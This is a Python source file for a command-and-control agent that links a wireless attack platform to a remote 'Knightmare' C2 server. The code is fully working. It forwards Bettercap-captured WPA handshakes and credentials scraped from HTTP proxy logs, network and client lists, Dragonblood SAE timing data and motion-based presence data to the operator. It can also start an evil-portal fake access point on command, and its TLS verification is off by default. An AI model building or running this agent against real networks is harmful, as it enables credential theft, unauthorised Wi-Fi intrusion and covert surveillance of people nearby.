# Control/services/c2_agent.py — Tengu Marauder Stryker C2 Agent
#
# Registers TMS as an agent on the Knightmare C2 server and:
#   • Routes operator commands to TMS hardware services
#   • Streams parsed findings (Kismet, Bettercap, Dragonfly SAE, ESPectre) to C2
#
# Usage (integrated — call from operatorcontrol.py):
#   from Control.services.c2_agent import C2AgentService
#   c2 = C2AgentService(drive_svc, marauder_svc, scanner_svc, status_fn)
#   c2.start(host="<ip>", password="<pw>")
#
# Usage (standalone for testing):
#   python -m Control.services.c2_agent --host <ip> --password <pw>

import ssl
import socket
import threading
import time
import os
import json
import platform
import subprocess
import re
import hashlib
from collections import defaultdict

# ---------------------------------------------------------------------------
# Protocol constants — inline to avoid a hard dependency on the Knightmare repo.
# Keep in sync with c2/protocol.py.
# ---------------------------------------------------------------------------
AGENT_PORT     = 31337
AUTH           = "auth"
AUTH_OK        = "auth_ok"
AUTH_FAIL      = "auth_fail"
REGISTER       = "register"
REGISTER_OK    = "register_ok"
COMMAND        = "command"
OUTPUT         = "output"
DONE           = "done"
DATA           = "data"
TASK           = "task"
TASK_ACK       = "task_ack"
TASK_STOP      = "task_stop"
ERROR          = "error"
PLATFORM_TMS   = "tms"

# Data categories
CAT_NETWORKS   = "networks"
CAT_HANDSHAKES = "handshakes"
CAT_SAE_TIMING = "sae_timing"
CAT_PORTALS    = "portals"
CAT_BLUETOOTH  = "bluetooth"
CAT_RF         = "rf"
CAT_CLIENTS    = "clients"
CAT_PRESENCE   = "presence"

# Roles
ROLE_KISMET      = "kismet"
ROLE_BETTERCAP   = "bettercap"
ROLE_EVIL_PORTAL = "evil_portal"
ROLE_DRAGONFLY   = "dragonfly"
ROLE_ESPECTRE    = "espectre"
ROLE_SCAN        = "scan"
ROLE_IDLE        = "idle"


def _encode(msg_type: str, **data) -> bytes:
    return (json.dumps({"type": msg_type, **data}) + "\n").encode()


def _decode(line: bytes) -> dict:
    return json.loads(line.decode().strip())


def _hash_password(pw: str) -> str:
    return hashlib.sha256(pw.encode()).hexdigest()


# ---------------------------------------------------------------------------
# Data collectors — one per role
# ---------------------------------------------------------------------------

class KismetCollector:
    """Polls Kismet REST API and yields parsed network/client records."""

    BASE = "http://localhost:2501"

    def collect_networks(self) -> list[dict]:
        try:
            import urllib.request
            req = urllib.request.Request(
                f"{self.BASE}/devices/views/all/devices.json",
                headers={"KISMET": "kismet"},
            )
            with urllib.request.urlopen(req, timeout=5) as r:
                devices = json.loads(r.read())
            networks = []
            for d in devices:
                ssid = (d.get("dot11.device", {})
                         .get("dot11.device.last_beaconed_ssid_record", {})
                         .get("dot11.advertisedssid.ssid", ""))
                bssid = d.get("kismet.device.base.macaddr", "")
                ch    = d.get("kismet.device.base.channel", "")
                sig   = d.get("kismet.device.base.signal", {}).get(
                            "kismet.common.signal.last_signal", "")
                enc   = (d.get("dot11.device", {})
                          .get("dot11.device.last_beaconed_ssid_record", {})
                          .get("dot11.advertisedssid.crypt_string", ""))
                if bssid:
                    networks.append({
                        "ssid": ssid, "bssid": bssid,
                        "channel": ch, "signal": sig,
                        "encryption": enc,
                    })
            return networks
        except Exception:
            return []

    def collect_clients(self) -> list[dict]:
        try:
            import urllib.request
            req = urllib.request.Request(
                f"{self.BASE}/devices/views/phy-IEEE802.11/devices.json",
                headers={"KISMET": "kismet"},
            )
            with urllib.request.urlopen(req, timeout=5) as r:
                devices = json.loads(r.read())
            clients = []
            for d in devices:
                dtype = d.get("kismet.device.base.type", "")
                if "Client" not in dtype:
                    continue
                mac   = d.get("kismet.device.base.macaddr", "")
                bssid = (d.get("dot11.device", {})
                          .get("dot11.device.last_bssid", ""))
                ssid  = (d.get("dot11.device", {})
                          .get("dot11.device.last_beaconed_ssid_record", {})
                          .get("dot11.advertisedssid.ssid", ""))
                sig   = d.get("kismet.device.base.signal", {}).get(
                            "kismet.common.signal.last_signal", "")
                if mac:
                    clients.append({
                        "mac": mac, "bssid": bssid,
                        "ssid": ssid, "signal": sig,
                    })
            return clients
        except Exception:
            return []


class BettercapCollector:
    """Polls Bettercap REST API for handshakes and credentials."""

    BASE     = "http://localhost:8081/api"
    # Default bettercap REST creds (set in bettercap caplet)
    USER     = os.getenv("BETTERCAP_USER", "user")
    PASSWORD = os.getenv("BETTERCAP_PASS", "pass")

    def _get(self, path: str) -> dict | list | None:
        try:
            import urllib.request, base64
            creds  = base64.b64encode(f"{self.USER}:{self.PASSWORD}".encode()).decode()
            req    = urllib.request.Request(
                f"{self.BASE}{path}",
                headers={"Authorization": f"Basic {creds}"},
            )
            with urllib.request.urlopen(req, timeout=5) as r:
                return json.loads(r.read())
        except Exception:
            return None

    def collect_handshakes(self) -> list[dict]:
        """
        Bettercap logs WPA handshakes to /root/bettercap-wifi-handshakes.pcap.
        We detect new captures by watching hcxpcapngtool output.
        """
        handshakes = []
        pcap = "/root/bettercap-wifi-handshakes.pcap"
        if not os.path.exists(pcap):
            return []
        try:
            out = subprocess.check_output(
                ["hcxpcapngtool", "--json", pcap],
                stderr=subprocess.DEVNULL, timeout=10,
            ).decode()
            for line in out.splitlines():
                try:
                    entry = json.loads(line)
                    handshakes.append({
                        "bssid":  entry.get("AP", ""),
                        "client": entry.get("Station", ""),
                        "ssid":   entry.get("ESSID", ""),
                        "type":   entry.get("Type", "WPA"),
                    })
                except json.JSONDecodeError:
                    continue
        except Exception:
            pass
        return handshakes

    def collect_portals(self) -> list[dict]:
        """Read credentials captured by bettercap's http.proxy module."""
        portals = []
        log_path = "/root/bettercap-http.log"
        if not os.path.exists(log_path):
            return []
        try:
            with open(log_path) as f:
                for line in f:
                    # Basic heuristic: lines containing POST with common field names
                    if "username" in line.lower() or "password" in line.lower():
                        portals.append({"raw": line.strip(),
                                         "username": "", "password": "",
                                         "ssid": ""})
        except Exception:
            pass
        return portals


class DragonflyCollector:
    """
    Runs Vanhoef's dragonslayer (patched wpa_supplicant) and parses
    SAE commit/confirm timing measurements for side-channel analysis.

    Expects dragonslayer.py at the path configured in the task config.
    Ref: https://wpa3.mathyvanhoef.com/
    """

    def __init__(self, config: dict):
        self.interface    = config.get("interface",    "wlan1")
        self.target_bssid = config.get("target_bssid", "")
        self.tool_path    = config.get("tool_path",
                                       "/opt/dragonblood/dragonslayer.py")
        self._proc: subprocess.Popen | None = None
        self._records: list[dict] = []
        self._lock = threading.Lock()

    def start(self):
        if not os.path.exists(self.tool_path):
            print(f"[dragonfly] Tool not found: {self.tool_path}")
            return
        cmd = [
            "python3", self.tool_path,
            "--interface", self.interface,
        ]
        if self.target_bssid:
            cmd += ["--bssid", self.target_bssid]
        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            threading.Thread(target=self._read_output, daemon=True).start()
        except Exception as e:
            print(f"[dragonfly] Failed to start: {e}")

    def _read_output(self):
        """Parse dragonslayer timing output line by line."""
        # Example line format from patched wpa_supplicant:
        # SAE: commit scalar_time=123.4us element_time=456.7us group=19 bssid=AA:BB:CC:DD:EE:FF
        timing_re = re.compile(
            r"scalar_time=(\d+(?:\.\d+)?)us\s+"
            r"element_time=(\d+(?:\.\d+)?)us\s+"
            r"group=(\d+)\s+"
            r"bssid=([\w:]+)"
        )
        for line in self._proc.stdout:
            m = timing_re.search(line)
            if m:
                scalar_us = float(m.group(1))
                element_us= float(m.group(2))
                group     = int(m.group(3))
                bssid     = m.group(4)
                # Simple timing anomaly heuristic — large variance may indicate
                # a cache-based side channel (Dragonblood style)
                anomaly   = scalar_us > 1000 or element_us > 1000
                record = {
                    "bssid":            bssid,
                    "scalar_time_us":   scalar_us,
                    "element_time_us":  element_us,
                    "group":            group,
                    "anomaly":          anomaly,
                }
                with self._lock:
                    self._records.append(record)

    def collect(self) -> list[dict]:
        with self._lock:
            records, self._records = self._records, []
        return records

    def stop(self):
        if self._proc:
            self._proc.terminate()
            self._proc = None


class EspectreCollector:
    """
    Reads ESPectre CSI motion/presence data from the ESP32 via serial or MQTT.

    ESPectre publishes:
      - movement_score (float) — higher = more motion
      - presence (bool)        — true if movement above threshold

    We read from the serial port (Micro-ESPectre UART output) or
    from an MQTT topic if configured.
    """

    def __init__(self, config: dict):
        self.mode         = config.get("mode",   "serial")   # "serial" or "mqtt"
        self.port         = config.get("port",   "/dev/ttyUSB1")
        self.baud         = config.get("baud",   115200)
        self.mqtt_host    = config.get("mqtt_host", "localhost")
        self.mqtt_topic   = config.get("mqtt_topic", "espectre/motion")
        self._records: list[dict] = []
        self._lock  = threading.Lock()
        self._running = False

    def start(self):
        self._running = True
        if self.mode == "serial":
            threading.Thread(target=self._read_serial, daemon=True).start()
        else:
            threading.Thread(target=self._read_mqtt, daemon=True).start()

    def _read_serial(self):
        try:
            import serial
            ser = serial.Serial(self.port, self.baud, timeout=1)
            # Micro-ESPectre outputs JSON lines:
            # {"movement_score": 0.42, "presence": true}
            while self._running:
                line = ser.readline().decode(errors="ignore").strip()
                if not line:
                    continue
                try:
                    data = json.loads(line)
                    record = {
                        "movement_score": data.get("movement_score", 0.0),
                        "presence":       data.get("presence", False),
                        "port":           self.port,
                    }
                    with self._lock:
                        self._records.append(record)
                except json.JSONDecodeError:
                    continue
        except Exception as e:
            print(f"[espectre] Serial error: {e}")

    def _read_mqtt(self):
        try:
            import paho.mqtt.client as mqtt

            def on_message(client, userdata, msg):
                try:
                    data = json.loads(msg.payload)
                    record = {
                        "movement_score": data.get("movement_score", 0.0),
                        "presence":       data.get("presence", False),
                        "topic":          msg.topic,
                    }
                    with self._lock:
                        self._records.append(record)
                except Exception:
                    pass

            client = mqtt.Client()
            client.on_message = on_message
            client.connect(self.mqtt_host)
            client.subscribe(self.mqtt_topic)
            client.loop_start()
            while self._running:
                time.sleep(1)
            client.loop_stop()
        except ImportError:
            print("[espectre] paho-mqtt not installed. Run: pip install paho-mqtt")
        except Exception as e:
            print(f"[espectre] MQTT error: {e}")

    def collect(self) -> list[dict]:
        with self._lock:
            records, self._records = self._records, []
        return records

    def stop(self):
        self._running = False


# ---------------------------------------------------------------------------
# C2 Agent service
# ---------------------------------------------------------------------------

class C2AgentService:
    """
    Background service that connects TMS to the Knightmare C2 teamserver.
    Handles both operator commands and autonomous data streaming.
    """

    CAPABILITIES = ["drive", "marauder", "scanner", "status",
                    "kismet", "bettercap", "dragonfly", "espectre", "evil_portal"]
    DATA_PUSH_INTERVAL = 30   # seconds between data pushes

    def __init__(self, drive_svc=None, marauder_svc=None,
                 scanner_svc=None, status_fn=None):
        self._drive    = drive_svc
        self._marauder = marauder_svc
        self._scanner  = scanner_svc
        self._status   = status_fn
        self._role     = ROLE_IDLE
        self._role_cfg : dict = {}
        self._thread   : threading.Thread | None = None
        self._stop      = threading.Event()

        # Active collectors (set when a role is assigned)
        self._dragonfly : DragonflyCollector | None  = None
        self._espectre  : EspectreCollector | None   = None
        self._kismet    = KismetCollector()
        self._bettercap = BettercapCollector()

        self._sock : ssl.SSLSocket | None = None
        self._wlock = threading.Lock()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self, host: str, password: str,
              port: int = AGENT_PORT, cert: str | None = None):
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run,
            args=(host, port, password, cert),
            daemon=True, name="c2-agent",
        )
        self._thread.start()

    def stop(self):
        self._stop.set()

    # ------------------------------------------------------------------
    # Network helpers
    # ------------------------------------------------------------------

    def _ssl_ctx(self, cert: str | None) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        if cert:
            ctx.load_verify_locations(cert)
            ctx.verify_mode    = ssl.CERT_REQUIRED
            ctx.check_hostname = False
        else:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        return ctx

    def _write(self, msg_type: str, **data):
        with self._wlock:
            if self._sock:
                self._sock.sendall(_encode(msg_type, **data))

    # ------------------------------------------------------------------
    # Connection / reconnect loop
    # ------------------------------------------------------------------

    def _run(self, host: str, port: int, password: str, cert: str | None):
        retry = 5
        while not self._stop.is_set():
            try:
                print(f"[c2-agent] Connecting to {host}:{port}…")
                raw  = socket.create_connection((host, port), timeout=10)
                sock = self._ssl_ctx(cert).wrap_socket(raw, server_hostname=host)
                self._sock = sock
                f    = sock.makefile("rb")

                sock.sendall(_encode(AUTH, password=password))
                resp = _decode(f.readline())
                if resp.get("type") != AUTH_OK:
                    print(f"[c2-agent] Auth failed: {resp.get('reason')}")
                    sock.close()
                    time.sleep(retry)
                    continue

                sock.sendall(_encode(REGISTER,
                    platform     = PLATFORM_TMS,
                    hostname     = platform.node(),
                    user         = os.getenv("USER") or os.getenv("USERNAME") or "pi",
                    capabilities = self.CAPABILITIES,
                ))
                resp = _decode(f.readline())
                if resp.get("type") != REGISTER_OK:
                    print("[c2-agent] Registration failed.")
                    sock.close()
                    time.sleep(retry)
                    continue

                print(f"[c2-agent] Registered as session {resp['session_id']}")

                # Start data push thread
                push_t = threading.Thread(
                    target=self._data_push_loop, daemon=True, name="c2-data-push")
                push_t.start()

                self._command_loop(f)

            except (OSError, ssl.SSLError, ConnectionRefusedError) as e:
                print(f"[c2-agent] Connection error: {e}. Retry in {retry}s…")
                time.sleep(retry)
            except Exception as e:
                print(f"[c2-agent] Unexpected error: {e}. Retry in {retry}s…")
                time.sleep(retry)
            finally:
                self._sock = None

    # ------------------------------------------------------------------
    # Command loop
    # ------------------------------------------------------------------

    def _command_loop(self, f):
        while not self._stop.is_set():
            try:
                line = f.readline()
                if not line:
                    print("[c2-agent] Server closed connection.")
                    break
                msg   = _decode(line)
                mtype = msg.get("type")

                if mtype == COMMAND:
                    output = self._dispatch(msg.get("cmd", ""))
                    for l in (output or "").splitlines():
                        self._write(OUTPUT, data=l + "\n")
                    self._write(DONE)

                elif mtype == TASK:
                    self._apply_task(msg.get("role", ROLE_IDLE),
                                     msg.get("config", {}))

            except (OSError, ssl.SSLError):
                break
            except Exception as e:
                try:
                    self._write(OUTPUT, data=f"[!] Error: {e}\n")
                    self._write(DONE)
                except Exception:
                    break

    # ------------------------------------------------------------------
    # Task / role management
    # ------------------------------------------------------------------

    def _apply_task(self, role: str, config: dict):
        print(f"[c2-agent] Task assigned: {role}")

        # Stop previous collectors
        if self._dragonfly:
            self._dragonfly.stop()
            self._dragonfly = None
        if self._espectre:
            self._espectre.stop()
            self._espectre = None

        self._role     = role
        self._role_cfg = config

        if role == ROLE_DRAGONFLY:
            self._dragonfly = DragonflyCollector(config)
            self._dragonfly.start()

        elif role == ROLE_ESPECTRE:
            self._espectre = EspectreCollector(config)
            self._espectre.start()

        elif role == ROLE_EVIL_PORTAL:
            ssid = config.get("ssid", "FreeWifi")
            self._dispatch(f"marauder evilportal start {ssid}")

        self._write(TASK_ACK, role=role)

    # ------------------------------------------------------------------
    # Data push loop
    # ------------------------------------------------------------------

    def _data_push_loop(self):
        while not self._stop.is_set() and self._sock:
            try:
                self._push_data()
            except Exception as e:
                print(f"[c2-data-push] Error: {e}")
            for _ in range(self.DATA_PUSH_INTERVAL):
                if self._stop.is_set() or not self._sock:
                    return
                time.sleep(1)

    def _push_data(self):
        role = self._role

        # Always push: status
        if self._status:
            s = self._status(self._drive, self._marauder)
            self._write(DATA, category="tms_status", records=[s])

        # Kismet — push when role is kismet or scan
        if role in (ROLE_KISMET, ROLE_SCAN):
            networks = self._kismet.collect_networks()
            if networks:
                self._write(DATA, category=CAT_NETWORKS, records=networks)
            clients = self._kismet.collect_clients()
            if clients:
                self._write(DATA, category=CAT_CLIENTS, records=clients)

        # Bettercap — push when role is bettercap
        if role == ROLE_BETTERCAP:
            handshakes = self._bettercap.collect_handshakes()
            if handshakes:
                self._write(DATA, category=CAT_HANDSHAKES, records=handshakes)
            portals = self._bettercap.collect_portals()
            if portals:
                self._write(DATA, category=CAT_PORTALS, records=portals)

        # Dragonfly SAE timing
        if role == ROLE_DRAGONFLY and self._dragonfly:
            records = self._dragonfly.collect()
            if records:
                self._write(DATA, category=CAT_SAE_TIMING, records=records)

        # ESPectre presence detection
        if role == ROLE_ESPECTRE and self._espectre:
            records = self._espectre.collect()
            if records:
                self._write(DATA, category=CAT_PRESENCE, records=records)

    # ------------------------------------------------------------------
    # Command dispatcher
    # ------------------------------------------------------------------

    def _dispatch(self, cmd_str: str) -> str:
        parts = cmd_str.strip().split()
        if not parts:
            return ""
        verb = parts[0].lower()
        rest = parts[1:]

        if verb == "drive":
            if not self._drive:
                return "[!] Drive service unavailable."
            direction = rest[0].lower() if rest else ""
            if direction == "forward":
                self._drive.move(forward=True);  return "Moving forward."
            elif direction in ("back", "backward"):
                self._drive.move(forward=False); return "Moving backward."
            elif direction == "left":
                self._drive.turn(right=False);   return "Turning left."
            elif direction == "right":
                self._drive.turn(right=True);    return "Turning right."
            elif direction == "stop":
                self._drive.stop();              return "Stopped."
            return "Usage: drive forward|back|left|right|stop"

        elif verb == "marauder":
            if not self._marauder:
                return "[!] Marauder service unavailable."
            if not rest:
                return "Usage: marauder <command>"
            result = self._marauder.send_command(" ".join(rest))
            return result or "[*] Command sent."

        elif verb == "scan":
            if not self._scanner:
                return "[!] Scanner service unavailable."
            target = rest[0].lower() if rest else ""
            if target == "network":
                self._scanner.start_network_scan()
                return "[*] Network scan started."
            elif target == "wifi":
                iface = rest[1] if len(rest) > 1 else None
                self._scanner.start_wifi_scan(iface)
                return "[*] WiFi scan started."
            elif target == "bluetooth":
                self._scanner.start_bluetooth_scan()
                return "[*] Bluetooth scan started."
            elif target == "rf":
                self._scanner.start_rf_scan()
                return "[*] RF scan started."
            return "Usage: scan network|wifi [iface]|bluetooth|rf"

        elif verb == "portscan":
            if not self._scanner:
                return "[!] Scanner unavailable."
            target = rest[0] if rest else ""
            flags  = " ".join(rest[1:]) if len(rest) > 1 else ""
            if not target:
                return "Usage: portscan <target> [flags]"
            self._scanner.start_port_scan(target, flags)
            return f"[*] Port scan of {target} started."

        elif verb == "ping":
            if not self._scanner:
                return "[!] Scanner unavailable."
            host = rest[0] if rest else ""
            return str(self._scanner.ping(host)) if host else "Usage: ping <host>"

        elif verb == "dns":
            if not self._scanner:
                return "[!] Scanner unavailable."
            host = rest[0] if rest else ""
            return str(self._scanner.dns_lookup(host)) if host else "Usage: dns <host>"

        elif verb == "status":
            if self._status:
                s = self._status(self._drive, self._marauder)
                return "\n".join([
                    f"CPU     : {s.get('cpu_percent','?')}%",
                    f"RAM     : {s.get('ram_used','?')} / {s.get('ram_total','?')} MB",
                    f"Disk    : {s.get('disk_used','?')} / {s.get('disk_total','?')} GB",
                    f"Uptime  : {s.get('uptime','?')}",
                    f"Role    : {self._role}",
                    f"Motors  : {'online' if s.get('motors_online') else 'offline'}",
                    f"Marauder: {'connected' if s.get('marauder_connected') else 'disconnected'}",
                ] + ([f"GPS     : {s['gps'].get('lat')},{s['gps'].get('lon')}"]
                     if s.get("gps") else []))
            return "[!] Status function not configured."

        elif verb == "interfaces":
            if not self._scanner:
                return "[!] Scanner unavailable."
            return str(self._scanner.wireless_interfaces())

        elif verb == "role":
            return f"Current role: {self._role}"

        elif verb == "help":
            return (
                "TMS session commands:\n"
                "  drive forward|back|left|right|stop\n"
                "  marauder <command>         — ESP32 Marauder command\n"
                "  scan network|wifi|bluetooth|rf\n"
                "  portscan <target> [flags]\n"
                "  ping <host> | dns <host>\n"
                "  interfaces                 — list wireless interfaces\n"
                "  status                     — system telemetry + current role\n"
                "  role                       — show current assigned role\n"
                "\nRoles are assigned from the operator console:\n"
                "  assign <session_id> kismet|bettercap|evil_portal|dragonfly|espectre\n"
            )

        else:
            return f"Unknown command: {verb}. Type 'help'."


# ---------------------------------------------------------------------------
# Standalone entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse
    import sys

    parser = argparse.ArgumentParser(description="TMS C2 Agent (standalone)")
    parser.add_argument("--host",     required=True)
    parser.add_argument("--port",     type=int, default=AGENT_PORT)
    parser.add_argument("--password", required=True)
    parser.add_argument("--cert",     default=None)
    args = parser.parse_args()

    agent = C2AgentService()
    agent.start(args.host, args.password, args.port, args.cert)
    print("[c2-agent] Running. Ctrl+C to stop.")
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        agent.stop()
        sys.exit(0)
